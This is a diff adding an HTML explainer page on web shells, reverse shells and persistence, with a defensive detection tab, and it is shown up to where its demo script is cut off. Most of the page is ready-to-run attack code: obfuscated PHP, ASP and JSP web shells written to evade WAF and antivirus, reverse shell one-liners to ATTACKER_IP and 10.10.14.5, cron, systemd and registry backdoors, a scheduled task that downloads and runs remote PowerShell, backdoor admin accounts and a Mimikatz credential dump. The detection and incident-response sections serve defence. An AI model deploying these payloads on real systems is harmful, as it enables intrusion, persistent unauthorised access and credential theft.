@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Web Shells & Backdoors</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.snum.p{background:#1e1030;color:#c084fc}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:120px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+<h1>Web Shells &amp; Backdoors</h1>
+<p class="sub">Post-exploitation · Persistence — deploy a remote access mechanism after initial foothold, survive reboots, evade detection</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">Overview</button>
+  <button class="tab-btn" onclick="showTab('shells',this)">Web shells</button>
+  <button class="tab-btn" onclick="showTab('reverse',this)">Reverse shells</button>
+  <button class="tab-btn" onclick="showTab('persist',this)">Persistence</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('detect',this)">Detection &amp; defense</button>
+</div>
+
+<!-- OVERVIEW -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">After gaining initial code execution (via file upload, RCE, SSTI, deserialization, etc.), an attacker plants a persistent access mechanism. Web shells provide HTTP-based command execution; reverse shells give an interactive terminal; backdoors survive reboots. Each has a different operational profile — detectability vs. capability vs. persistence.</p>
+
+  <svg width="100%" viewBox="0 0 680 320" style="max-width:680px;display:block;margin:0 auto 14px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Timeline: initial access → web shell → reverse shell → persistence -->
+    <rect x="20" y="30" width="120" height="52" rx="8" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="80" y="52" text-anchor="middle" font-size="11" font-weight="600" fill="#60a5fa" font-family="system-ui">Initial foothold</text>
+    <text x="80" y="68" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">RCE / file upload / SSTI</text>
+
+    <rect x="188" y="30" width="120" height="52" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="248" y="52" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Web shell</text>
+    <text x="248" y="68" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">HTTP-based cmd exec</text>
+
+    <rect x="356" y="30" width="120" height="52" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="416" y="52" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Reverse shell</text>
+    <text x="416" y="68" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">Interactive terminal</text>
+
+    <rect x="524" y="30" width="136" height="52" rx="8" fill="#3a1515" stroke="#f87171" stroke-width="1"/>
+    <text x="592" y="52" text-anchor="middle" font-size="12" font-weight="600" fill="#f87171" font-family="system-ui">Persistence</text>
+    <text x="592" y="68" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">Survives reboot</text>
+
+    <line x1="142" y1="56" x2="186" y2="56" stroke="#888" stroke-width="1" marker-end="url(#arr)"/>
+    <line x1="310" y1="56" x2="354" y2="56" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+    <line x1="478" y1="56" x2="522" y2="56" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+
+    <!-- Three columns comparison -->
+    <rect x="20" y="112" width="196" height="190" rx="8" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="118" y="132" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Web Shell</text>
+    <text x="36" y="152" font-size="10" fill="#888" font-family="system-ui">Pros:</text>
+    <text x="36" y="168" font-size="10" fill="#4ade80" font-family="system-ui">+ Works through firewalls</text>
+    <text x="36" y="184" font-size="10" fill="#4ade80" font-family="system-ui">+ No listening port needed</text>
+    <text x="36" y="200" font-size="10" fill="#4ade80" font-family="system-ui">+ Uses normal HTTP traffic</text>
+    <text x="36" y="220" font-size="10" fill="#888" font-family="system-ui">Cons:</text>
+    <text x="36" y="236" font-size="10" fill="#f87171" font-family="system-ui">– File on disk (detectable)</text>
+    <text x="36" y="252" font-size="10" fill="#f87171" font-family="system-ui">– Non-interactive</text>
+    <text x="36" y="268" font-size="10" fill="#f87171" font-family="system-ui">– Web server logs traffic</text>
+    <text x="36" y="288" font-size="10" fill="#fbbf24" font-family="system-ui">Detection: file scan, WAF</text>
+
+    <rect x="242" y="112" width="196" height="190" rx="8" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="132" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Reverse Shell</text>
+    <text x="258" y="152" font-size="10" fill="#888" font-family="system-ui">Pros:</text>
+    <text x="258" y="168" font-size="10" fill="#4ade80" font-family="system-ui">+ Full interactive TTY</text>
+    <text x="258" y="184" font-size="10" fill="#4ade80" font-family="system-ui">+ No file needed (in-mem)</text>
+    <text x="258" y="200" font-size="10" fill="#4ade80" font-family="system-ui">+ Full shell features</text>
+    <text x="258" y="220" font-size="10" fill="#888" font-family="system-ui">Cons:</text>
+    <text x="258" y="236" font-size="10" fill="#f87171" font-family="system-ui">– Outbound connection visible</text>
+    <text x="258" y="252" font-size="10" fill="#f87171" font-family="system-ui">– Dies if process killed</text>
+    <text x="258" y="268" font-size="10" fill="#f87171" font-family="system-ui">– Needs open listener port</text>
+    <text x="258" y="288" font-size="10" fill="#fbbf24" font-family="system-ui">Detection: netflow, EDR</text>
+
+    <rect x="464" y="112" width="196" height="190" rx="8" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="562" y="132" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Persistence</text>
+    <text x="480" y="152" font-size="10" fill="#888" font-family="system-ui">Pros:</text>
+    <text x="480" y="168" font-size="10" fill="#4ade80" font-family="system-ui">+ Survives reboots</text>
+    <text x="480" y="184" font-size="10" fill="#4ade80" font-family="system-ui">+ Auto-restarts on crash</text>
+    <text x="480" y="200" font-size="10" fill="#4ade80" font-family="system-ui">+ Long-term access</text>
+    <text x="480" y="220" font-size="10" fill="#888" font-family="system-ui">Cons:</text>
+    <text x="480" y="236" font-size="10" fill="#f87171" font-family="system-ui">– High detection risk</text>
+    <text x="480" y="252" font-size="10" fill="#f87171" font-family="system-ui">– Modifies system state</text>
+    <text x="480" y="268" font-size="10" fill="#f87171" font-family="system-ui">– Requires privesc often</text>
+    <text x="480" y="288" font-size="10" fill="#fbbf24" font-family="system-ui">Detection: cron, auth keys</text>
+  </svg>
+</div>
+
+<!-- WEB SHELLS -->
+<div class="tab-panel" id="tab-shells">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Web shells provide command execution through HTTP requests — they survive web server restarts and don't require any outbound connection, making them firewall-friendly.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Minimal one-liners — language reference</div>
+    <div class="code"># PHP
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passthru($_GET['c']); ?&gt;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+&lt;?php echo `$_GET[cmd]`; ?&gt;
+&lt;?php eval($_POST['code']); ?&gt;           # execute arbitrary PHP
+&lt;?php $a=base64_decode($_POST['x']);eval($a); ?&gt;  # encoded eval
+
+# ASP (Classic)
+&lt;% eval request("cmd") %&gt;
+&lt;% Set s=CreateObject("WScript.Shell"):s.Run(request("c")) %&gt;
+
+# ASPX (.NET)
+&lt;%@ Page Language="C#"%&gt;&lt;%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true}}.Start()?System.Diagnostics.Process.GetCurrentProcess().StandardOutput.ReadToEnd():"");%&gt;
+
+# JSP (Java / Tomcat)
+&lt;%=Runtime.getRuntime().exec(request.getParameter("cmd"))%&gt;
+
+# Python (Flask / Django debug)
+import os; os.system(request.args.get('cmd'))
+
+# Node.js
+require('child_process').exec(req.query.cmd,(e,s)=&gt;res.send(s))</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Obfuscated shells — WAF and AV evasion</div>
+    <div class="code"># PHP — string concatenation obfuscation
+&lt;?php $a='sys'.'tem';$a($_GET[0]); ?&gt;
+
+# PHP — variable functions
+&lt;?php $f='system';$f($_GET['c']); ?&gt;
+
+# PHP — base64 encoded payload
+&lt;?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?&gt;
+# Decodes to: system($_GET['c']);
+
+# PHP — hex encoding
+&lt;?php \x73\x79\x73\x74\x65\x6d($_GET['c']); ?&gt;
+
+# PHP — using create_function (deprecated but still works)
+&lt;?php $f=create_function('$c','system($c);');$f($_GET['c']); ?&gt;
+
+# PHP — chr() obfuscation
+&lt;?php $s=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$s($_GET['c']); ?&gt;
+
+# Double-encoded for WAF bypass
+%253c%253f%2570%2568%2570%2520 ... (URL double-encode)</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Full-featured shell panels</div>
+    <div class="code"># China Chopper — 2-byte server component (hard to detect by size)
+&lt;?php @eval($_POST['password'])?&gt;
+# Feature-rich Windows client connects to it
+# Capabilities: file manager, database client, virtual terminal
+
+# b374k — password-protected, feature-rich
+# Features: file manager, command execution, network tools,
+#           process list, encoded communications
+
+# Weevely — Python client + obfuscated PHP server
+weevely generate MyP4ssw0rd ./shell.php
+weevely http://target.com/uploads/shell.php MyP4ssw0rd
+# Generates polymorphic obfuscated PHP
+# Communications disguised as normal HTTP traffic
+
+# p0wnyshell — browser-based terminal UI
+# WSO — file manager + SQL client + reverse shell launcher</div>
+  </div>
+</div>
+
+<!-- REVERSE SHELLS -->
+<div class="tab-panel" id="tab-reverse">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">A reverse shell makes the target connect <em>out</em> to the attacker's listener — bypassing inbound firewall rules. Once connected, you get an interactive terminal session.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Setting up the listener</div>
+    <div class="code"># Basic netcat listener
+nc -lvnp 4444
+
+# Rlwrap for arrow key / history support
+rlwrap nc -lvnp 4444
+
+# Metasploit multi/handler (more stable, handles reconnects)
+msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
+
+# After catching a shell — upgrade to full TTY:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z → stty raw -echo; fg
+# export TERM=xterm; stty rows 50 cols 200</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Reverse shell one-liners — all languages</div>
+    <div class="code"># Bash
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'
+
+# Netcat (with -e flag)
+nc -e /bin/bash ATTACKER_IP 4444
+# Netcat without -e (OpenBSD netcat)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ATTACKER_IP 4444 &gt;/tmp/f
+
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'
+
+# PHP
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+# PowerShell (Windows)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"&gt; ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}</div>
+  </div>
+
+  <div class="sc-card sc-blue">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Encrypted / tunneled reverse shells — evade network detection</div>
+    <div class="code"># socat — encrypted reverse shell (TLS)
+# Attacker:
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key shell.crt &gt; shell.pem
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 -
+
+# Target:
+socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# Traffic is TLS-encrypted → network sensors see encrypted traffic
+# No plaintext commands visible in packet captures
+
+# Chisel — HTTP tunnel (bypasses firewall, looks like web traffic)
+# Attacker:
+./chisel server -p 8080 --reverse
+
+# Target:
+./chisel client ATTACKER_IP:8080 R:socks
+# Creates SOCKS5 proxy over HTTP — tunnel any traffic through it</div>
+  </div>
+</div>
+
+<!-- PERSISTENCE -->
+<div class="tab-panel" id="tab-persist">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Persistence mechanisms survive reboots and process kills. They require higher privileges and carry higher detection risk — use only when the engagement calls for it.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Linux persistence techniques</div>
+    <div class="code"># 1. Cron job — runs at interval
+echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'" \
+  | crontab -
+# Check: crontab -l
+
+# 2. SSH authorized_keys — public key backdoor
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAA...attacker-public-key..." &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+# Now SSH in anytime: ssh user@target -i attacker_private_key
+
+# 3. /etc/cron.d/ — system-wide (root needed)
+echo '* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1"' \
+  &gt; /etc/cron.d/system-update
+
+# 4. Systemd service — restarts automatically
+cat &gt; /etc/systemd/system/update-service.service &lt;&lt; 'END'
+[Unit]
+Description=System Update Service
+[Service]
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+END
+systemctl enable update-service
+systemctl start update-service
+
+# 5. ~/.bashrc / ~/.bash_profile — fires on login
+echo 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1 &amp;' &gt;&gt; ~/.bashrc
+
+# 6. SUID backdoor (needs root)
+cp /bin/bash /tmp/.hidden_bash
+chmod u+s /tmp/.hidden_bash
+# Later: /tmp/.hidden_bash -p  → root shell</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Windows persistence techniques</div>
+    <div class="code"># 1. Registry Run key — executes on user login
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
+  /v "WindowsUpdate" /t REG_SZ \
+  /d "C:\Users\user\AppData\Roaming\update.exe" /f
+
+# 2. Scheduled task — runs at interval or on event
+schtasks /create /sc minute /mo 1 /tn "SystemHealth" \
+  /tr "powershell.exe -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" \
+  /ru SYSTEM
+
+# 3. Windows service
+sc create BackdoorSvc binpath= "C:\Windows\Temp\svc.exe" start= auto
+sc start BackdoorSvc
+
+# 4. DLL hijacking — replace a DLL loaded by a legitimate app
+# Drop malicious DLL in app directory → loaded on next app start
+
+# 5. WMI event subscription (fileless — lives in WMI DB)
+$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription ...
+# Survives reboots, no file on disk, hard to detect</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Creating a new backdoor admin user</div>
+    <div class="code"># Linux — add root user
+useradd -m -s /bin/bash -G sudo backdoor
+echo 'backdoor:B@ckd00r!' | chpasswd
+# Harder to detect: use an existing username with slight variation
+# Or add SSH key to root's authorized_keys
+
+# Windows — add admin user
+net user backdoor B@ckd00r! /add
+net localgroup Administrators backdoor /add
+# Harder to detect: enable the built-in Administrator account
+net user Administrator B@ckd00r! /active:yes
+
+# Mimikatz — extract and use existing credentials (no new user needed)
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+# Dumps NTLM hashes of all logged-on users → PTH or crack → reuse</div>
+  </div>
+</div>
+
+<!-- LIVE DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate deploying and using different backdoor types. See what each one looks like from the attacker's perspective and what traces it leaves on the target.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">Backdoor type</div>
+    <select id="backdoor-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="webshell">Web shell — PHP one-liner</option>
+      <option value="chopper">China Chopper — minimal footprint</option>
+      <option value="revshell">Bash reverse shell</option>
+      <option value="cron">Cron persistence</option>
+      <option value="sshkey">SSH authorized_keys backdoor</option>
+      <option value="systemd">Systemd service persistence</option>
+    </select>
+  </div>
+
+  <div class="grid2" style="margin-bottom:10px;">
+    <div>
+      <div class="chip">Attacker deploys</div>
+      <div class="mono-out" id="deploy-out" style="min-height:100px;"></div>
+    </div>
+    <div>
+      <div class="chip">Attacker uses</div>
+      <div class="mono-out" id="use-out" style="min-height:100px;"></div>
+    </div>
+  </div>
+
+  <div>
+    <div class="chip">Evidence left on target system</div>
+    <div class="mono-out" id="evidence-out" style="min-height:80px;"></div>
+  </div>
+  <div id="demo-verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- DETECTION & DEFENSE -->
+<div class="tab-panel" id="tab-detect">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Detecting web shells and backdoors from the defender's perspective — what to look for and how to prevent deployment.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Web shell detection</div>
+    <div class="code"># File system — find recently modified PHP files
+find /var/www -name "*.php" -newer /var/www/html/index.php -ls
+find /var/www -name "*.php" -mtime -7 -exec grep -l "system\|exec\|passthru\|eval\|base64_decode" {} \;
+
+# Linux Malware Detect (maldet)
+maldet --scan-all /var/www/
+
+# ClamAV
+clamscan -r /var/www/ --infected
+
+# YARA rules — pattern matching
+yara -r webshell_rules.yar /var/www/
+
+# Web server access logs — look for shell usage patterns
+grep -E "(cmd=|c=|command=|exec=|shell=)" /var/log/nginx/access.log
+grep "200" /var/log/apache2/access.log | grep -E "\.(php|aspx?|jsp)\?" | \
+  awk '{print $7}' | sort | uniq -c | sort -rn | head -20
+
+# Detect obfuscated eval() patterns
+grep -rP "eval\s*\(\s*(base64_decode|str_rot13|gzinflate|gzuncompress)" /var/www/</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Reverse shell / network detection</div>
+    <div class="code"># Check for unexpected outbound connections
+ss -tnp | grep ESTABLISHED
+netstat -tnp | grep "ESTABLISHED"
+# Look for: web server process (apache2, nginx, php-fpm)
+# connecting to external IPs on unusual ports
+
+# Audit listening processes
+ss -tlnp
+# Unexpected listeners on high ports = bind shell
+
+# Monitor with auditd (real-time)
+auditctl -a always,exit -F arch=b64 -S execve -k exec_monitoring
+ausearch -k exec_monitoring | grep -v "legitimate_process"
+
+# EDR / SIEM detection rules:
+# - Child process of web server (apache spawning bash)
+# - Web server process making outbound TCP connection
+# - /bin/bash with stdin/stdout redirected to socket</div>
+  </div>
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">Prevention — stop shells before they land <span class="badge b-red">Root fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">All backdoor deployment requires an initial vulnerability. Fix the underlying vector and you prevent the backdoor entirely. Defense in depth slows down attackers who do get in.</div>
+    <div class="code"># 1. Disable PHP execution in upload directories (covered in file upload explainer)
+# nginx: no php-fpm passthrough for /uploads/
+# Apache: php_flag engine off in /uploads/.htaccess
+
+# 2. Run web server as least-privilege user
+# www-data should NOT have write access to its own document root
+chown -R root:root /var/www/html
+chmod -R 755 /var/www/html
+# www-data can read but NOT write
+
+# 3. Read-only filesystem (containers)
+# Docker: --read-only flag
+# k8s: readOnlyRootFilesystem: true
+
+# 4. Outbound firewall — block all except whitelisted destinations
+iptables -A OUTPUT -m owner --uid-owner www-data -j DROP
+iptables -A OUTPUT -m owner --uid-owner www-data -d 8.8.8.8 -j ACCEPT
+# Web server process cannot initiate connections to attacker
+
+# 5. File integrity monitoring
+aide --init   # AIDE — takes baseline
+aide --check  # Alerts on any file changes in /var/www/</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">Incident response — shell found, now what?</div>
+    <div class="code"># 1. Isolate — take server off network (don't reboot yet)
+# 2. Capture volatile state before it's lost
+ss -tnp &gt; /tmp/connections.txt
+ps auxf &gt; /tmp/processes.txt
+who &gt; /tmp/sessions.txt
+last -20 &gt; /tmp/logins.txt
+find /tmp /var/tmp -executable -ls &gt; /tmp/suspicious_exec.txt
+
+# 3. Preserve logs (attackers often delete them)
+cp -rp /var/log/ /forensics/logs/
+
+# 4. Timeline — when did the shell appear?
+ls -la --full-time /var/www/html/shell.php
+stat /var/www/html/shell.php
+
+# 5. Find the initial vector — check logs around file creation time
+grep "POST.*upload" /var/log/nginx/access.log
+
+# 6. Check for additional backdoors and persistence
+crontab -l; cat /etc/cron*/*
+cat ~/.ssh/authorized_keys
+systemctl list-units --state=active | grep -v standard_services
+find / -name ".bashrc" -exec grep -H "bash.*tcp" {} \; 2>/dev/null</div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const DEMOS={
+  webshell:{
+    deploy:`# Upload shell.php to /var/www/html/uploads/
+# via vulnerable file upload endpoint:
+
+curl -F "file=@shell.php" https://target.com/upload
+# → {"path":"/uploads/shell.php"}
+
+# shell.php contents (one line):
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+
+# File size: 34 bytes
+# Detection difficulty: LOW (file on disk, grep-able)`,
+    use:`# Execute commands via HTTP GET:
+curl "https://target.com/uploads/shell.php?cmd=id"
+uid=33(www-data) gid=33(www-data)
+
+curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+...
+
+curl "https://target.com/uploads/shell.php?cmd=uname+-a"
+Linux target 5.15.0-91-generic x86_64
+
+# Upgrade to reverse shell:
+curl "https://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"`,
+    evidence:`# Files on disk:
+/var/www/html/uploads/shell.php  (34 bytes, created now)
+
+# Web server access log:
+10.10.14.5 - - "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 42
+10.10.14.5 - - "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1832
+
+# Detection vectors:
+- File system scan: grep for "system(" in PHP files
+- Access log: ?cmd= parameter pattern
+- File integrity monitor: new file in uploads/`,
+    verdict:'<strong>Web shell deployed.</strong> Simple, firewall-friendly, but noisy — the file is on disk and commands appear in access logs as ?cmd= parameters. Detection via file scan or log analysis is straightforward for defenders.'
+  },
+  chopper:{
+    deploy:`# China Chopper — server component is just 2 bytes
+echo '&lt;?php @eval($_POST["password"])?&gt;' &gt; update.php
+# File size: 38 bytes — looks like a stub/placeholder
+
+# The @ suppresses error output
+# eval() executes arbitrary PHP from POST body
+# All functionality is in the Windows client software`,
+    use:`# China Chopper client sends obfuscated POST:
+POST /update.php HTTP/1.1
+password=@eval(base64_decode('c3lzdGVtKCdpZCcpOw=='));
+
+# Server executes: system('id');
+# Response: uid=33(www-data) gid=33(www-data)
+
+# Client provides full GUI:
+[File Manager] [Database Client] [Virtual Terminal]
+[Port Forward] [Process List]  [Backdoor CMD]
+
+# Traffic looks like normal POST form data
+# No ?cmd= in URL — harder to detect in access logs`,
+    evidence:`# Files on disk:
+/var/www/html/update.php  (38 bytes, created now)
+
+# Access log (much less obvious):
+10.10.14.5 - - "POST /update.php HTTP/1.1" 200 18
+
+# No cmd= parameter visible in access log
+# File content: &lt;?php @eval($_POST["password"])?&gt;
+
+# Detection vectors:
+- File scan: grep for eval($_POST
+- Anomaly: POST to .php file returning small response
+- Content analysis: eval() + base64 pattern`,
+    verdict:'<strong>China Chopper deployed.</strong> Minimal server-side footprint (38 bytes) with all functionality in the client. Commands hidden in POST body — not visible in URL access logs. Still detectable by scanning for eval($_POST patterns in PHP files.'
+  },
+  revshell:{
+    deploy:`# From web shell or RCE, trigger reverse shell:
+# (attacker already listening: nc -lvnp 4444)
+
+curl "https://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"
+
+# Or from SSTI/command injection:
